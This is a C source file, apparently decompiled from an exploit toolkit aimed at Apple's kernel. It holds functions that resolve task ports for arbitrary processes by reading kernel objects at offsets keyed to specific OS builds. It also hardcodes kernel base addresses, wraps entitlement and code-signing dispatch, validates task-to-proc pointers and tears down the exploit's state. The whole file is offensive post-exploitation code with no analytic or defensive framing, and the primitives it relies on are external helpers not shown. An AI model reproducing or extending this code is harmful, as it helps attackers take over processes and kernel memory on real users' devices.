/* record_0x90001_state_teardown.c
 * sub_3bc88..sub_3e1d8 — task port resolver, entitlement/code-sign
 * dispatch wrappers, kernel base resolver, and state teardown.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>

/* ── extern helpers ─────────────────────────────────────────────── */
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_36098(long state, uint32_t mask);
extern long sub_1972c(long state, long addr);
extern long sub_32c78(long state, long port);
extern long sub_33414(long state, long kobj, long pid);
extern long sub_336ac(long state, long kobj, long h);
extern long sub_36480(long state, long entry_addr, mach_port_name_t *out);
extern long sub_349c8(long state, long h);
extern long sub_3c25c(long state, long a, long b, long c, long d);
extern long sub_3c9a4(long state, long h);
extern long sub_12ef8(void);
extern void sub_38764(long state);
extern int  sub_252d4(int *fd);
extern void sub_25294(int fd);
extern void sub_26b00(long state, int fl);
extern void sub_a9cc(long state);
extern void sub_28d44(long state);
extern void sub_1a520(void);

/* forward decl */
static int sub_3bc94(long state, long pid, long h, mach_port_t *out);

/* ── sub_3bc88 — thin wrapper: sub_3bc94 with param_3=0 ─────────── */
void sub_3bc88(long state, long pid, mach_port_t *out)
{
    sub_3bc94(state, pid, 0, out);
}

/* ── sub_3bc94 — resolve task port for pid ──────────────────────── */
static int sub_3bc94(long state, long pid, long h, mach_port_t *out)
{
    if ((int)pid > 0 && getpid() == (int)pid) {
        mach_port_t task = mach_task_self();
        kern_return_t kr = mach_port_mod_refs(task, task, MACH_PORT_RIGHT_SEND, 1);
        if (kr) return 0;
        *out = task;
        return 1;
    }

    int task_type = *(int *)(state + 0x191c);
    if (!task_type) task_type = *(int *)(state + 0x1918);

    long kobj = sub_32c78(state, (long)task_type);
    if (!kobj) return 0;

    long chain;
    if (!h) chain = sub_33414(state, kobj, pid);
    else    chain = sub_336ac(state, kobj, h);
    if (!chain) return 0;

    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off;
    if (build < 0x2258) {
        if (build - 0x1f53u < 2)
            off = ver <= 0x1f530f027fffffULL ? 0xf8 : 0xd0;
        else if (build == 0x1809 || build == 0x1c1b)
            off = ver <= 0x1c1b19145fffffULL ? 0xf8 : 0xf0;
        else return 0;
    } else {
        if (build == 0x2258 || build == 0x225c || build == 0x2712) off = 200;
        else return 0;
    }

    long v = 0;
    if (!sub_28840(state, off + chain, &v)) return 0;
    v = sub_1972c(state, v);
    if (!v) return 0;
    return sub_36480(state, v, out) == 0;
}

/* ── sub_3be3c — entitlement/code-sign dispatch (version-gated) ─── */
int sub_3be3c(long state, int pid, long a, long b, long c, long d)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    if (ver < 0x1c1b0002e00000ULL ||
        (*(uint32_t *)state & 0x5584001u) == 0 ||
        pid == (int)getpid()) {
        return (int)sub_3c25c(state, a, b, c, d) == 0;
    }
    /* newer path: version-gated offset + sub_3c9a4 */
    return (int)sub_3c9a4(state, a) == 0;
}

/* ── sub_3c398 — kernel static base address ─────────────────────── */
uint64_t sub_3c398(long state)
{
    int build = *(int *)(state + 0x140);
    int alt = sub_36098(state, 0x20);
    int alt2 = sub_36098(state, 8);

    int ok;
    if (build < 0x2258)
        ok = (build - 0x1f53u < 2) || build == 0x1809 || build == 0x1c1b;
    else
        ok = (build == 0x2258) || (build == 0x2712) || (build == 0x225c);

    if (!ok) return 0;

    if (alt)  return 0xfffffff027004000ULL;
    if (alt2) return 0xfffffe0007004000ULL;
    return 0xfffffff007004000ULL;
}

/* ── sub_3e1d8 — check task kobj has valid proc pointer ─────────── */
int sub_3e1d8(long state)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long kobj = sub_32c78(state, 0);
    if (!kobj) return 0;

    int off2 = ver < 0x18090a09600000ULL ? 0x38 : 0x30;
    int build = *(int *)(state + 0x140);
    long off;
    if (build < 0x2258) {
        if (build - 0x1f53u < 2)
            off = ver < 0x1f530f02800000ULL ? 0x338 : 0x310;
        else if (build == 0x1809)
            off = (long)off2 * 10;
        else if (build == 0x1c1b)
            off = ver < 0x1c1b1914600000ULL ? 0x3a8 : 0x3c0;
        else return 0;
    } else {
        if (build == 0x2258 || build == 0x225c || build == 0x2712) off = 0x3e0;
        else return 0;
    }

    long v = 0;
    if (!sub_28840(state, off + kobj, &v)) return 0;
    return sub_1972c(state, v) != 0;
}

/* ── sub_3f4bc — state teardown / cleanup ───────────────────────── */
void sub_3f4bc(long state)
{
    sub_12ef8();
    sub_38764(state);

    /* optional teardown callback */
    typedef void (*cb_t)(long);
    cb_t cb = *(cb_t *)(state + 0x1d0);
    if (cb) cb(state);

    /* deallocate cached task port */
    mach_port_name_t tp = *(mach_port_name_t *)(state + 0x1918);
    if (MACH_PORT_VALID(tp))
        mach_port_deallocate(mach_task_self(), tp);

    /* close fd pairs */
    int fds[] = {
        *(int *)(state + 0x1938), *(int *)(state + 0x193c),
        *(int *)(state + 0x1940), *(int *)(state + 0x1930),
        *(int *)(state + 0x1934)
    };
    int lock = -1;
    if (sub_252d4(&lock) == 0) {
        for (int i = 0; i < 5; i++) {
            if (fds[i] != -1) {
                close(fds[i]);
                *(int *)(state + 0x1938 + i * 4) = -1;
            }
        }
        sub_25294(lock);
    }

    if (*(long *)(state + 0x28)) sub_26b00(state, 1);

    uint64_t ver = *(uint64_t *)(state + 0x158);
    if (ver > 0x27120f04b00002ULL && (*(uint8_t *)state >> 5 & 1))
        sub_a9cc(state);

    if (*(long *)(state + 0x1d48)) {
        int lock2 = -1;
        if (sub_252d4(&lock2) == 0) {
            sub_28d44(state);
            sub_25294(lock2);
        }
    }

    /* free cached kext/helper allocations */
    static const long offsets[] = {
        0x1d18, 0x1d20, 0x1d28, 0x1d30, 0x1d38, 0x1a00, 0x19f8
    };
    for (int i = 0; i < 7; i++) {
        void **p = (void **)(state + offsets[i]);
        if (*p) { sub_1a520(); free(*p); *p = NULL; }
    }
    void **p2 = (void **)(state + 0x1d10);
    if (*p2) { free(*p2); *p2 = NULL; }
}
